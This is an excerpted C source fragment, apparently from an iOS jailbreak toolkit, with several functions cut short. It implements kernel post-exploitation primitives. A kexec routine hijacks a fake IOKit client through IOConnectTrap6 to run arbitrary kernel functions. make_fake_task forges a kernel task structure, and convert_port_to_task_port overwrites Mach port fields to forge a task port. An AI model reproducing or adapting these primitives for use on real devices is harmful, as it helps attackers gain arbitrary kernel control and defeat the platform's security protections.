...
kptr_t kexec(kptr_t ptr, kptr_t x0, kptr_t x1, kptr_t x2, kptr_t x3, kptr_t x4, kptr_t x5, kptr_t x6) {
    ...
    kptr_t offx20 = kread_uint64(fake_client + 0x40);
    kptr_t offx28 = kread_uint64(fake_client + 0x48);
    kwrite_uint64(fake_client + 0x40, x0);
    kwrite_uint64(fake_client + 0x48, ptr);
    returnval = IOConnectTrap6(user_client, 0, x1, x2, x3, x4, x5, x6);
    kwrite_uint64(fake_client + 0x40, offx20);
    kwrite_uint64(fake_client + 0x48, offx28);
...
kptr_t zm_fix_addr(kptr_t addr) {
    ...
    _assert(zm_hdr != NULL);
    kptr_t const zone_map = kread_uint64(symbol);
...
kptr_t make_fake_task(kptr_t vm_map) {
    ...
    *(uint8_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE)) = 0x22;
    ...
    ret = fake_task_kaddr;
out:;
    if (!KERN_POINTER_VALID(ret) && KERN_POINTER_VALID(fake_task_kaddr)) IOFree(fake_task_kaddr, fake_task_size);
    free(fake_task);
    return ret;
}
...
kptr_t ipc_space_kernel() {
    ...
    kptr_t const ipc_space = kread_uint64(task_self + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER));
...
bool convert_port_to_task_port(mach_port_t port, kptr_t space, kptr_t task_kaddr) {
    ...
    _assert(kwrite_uint64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), space));
    _assert(kwrite_uint64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT),  task_kaddr));
    kptr_t const task_port_addr = task_self_addr();
    _assert(KERN_POINTER_VALID(task_port_addr));
    kptr_t const task_addr = kread_uint64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    _assert(KERN_POINTER_VALID(task_addr));
    kptr_t const itk_space = kread_uint64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
    _assert(KERN_POINTER_VALID(itk_space));
    kptr_t const is_table = kread_uint64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
